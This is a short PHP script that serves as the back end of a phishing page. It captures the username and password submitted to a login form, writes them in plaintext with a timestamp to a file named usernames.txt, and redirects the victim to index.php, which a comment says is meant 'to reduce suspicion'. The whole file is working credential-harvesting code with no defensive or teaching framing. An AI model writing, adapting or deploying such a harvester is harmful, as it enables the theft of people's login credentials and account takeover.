<?php
#include __DIR__ . "/ip.php";
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Debug output removed to prevent header issues
    
    $log_line = "[" . date("Y-m-d H:i:s") . "] Username: " . $username . " | Password: " . $password . "\n";


    $log_file = __DIR__ . "/usernames.txt";
    if (!file_put_contents($log_file, $log_line, FILE_APPEND | LOCK_EX)) {
        error_log("Failed to write to log file: " . $log_file);
    }

    // Optionally, also print to screen (useful for debugging in test env)
    //echo nl2br(htmlspecialchars($log_line));

    // Redirect user to a real site (e.g. legitimate login page) to reduce suspicion
    header("Location: index.php");
    exit();
} else {
    // If accessed directly without POST, redirect to index.html
    header("Location: index.php");
    exit();
}
?>